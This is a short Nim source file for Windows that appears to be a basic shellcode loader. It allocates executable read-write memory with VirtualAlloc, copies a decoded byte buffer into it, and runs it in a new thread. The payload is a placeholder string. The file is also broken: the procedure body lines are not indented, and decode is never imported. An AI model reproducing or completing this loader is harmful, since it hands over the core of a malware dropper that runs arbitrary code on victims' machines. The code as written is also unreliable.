import winim
import winim/lean

proc vanilla[byte](shellcode: openArray[byte]): void =
  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
RtlMoveMemory(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
let hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
WaitForSingleObject(hThread, 0xFFFF);


when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "test"

  let shellcode = toByteSeq(decode(enc))
  vanilla(shellcode)

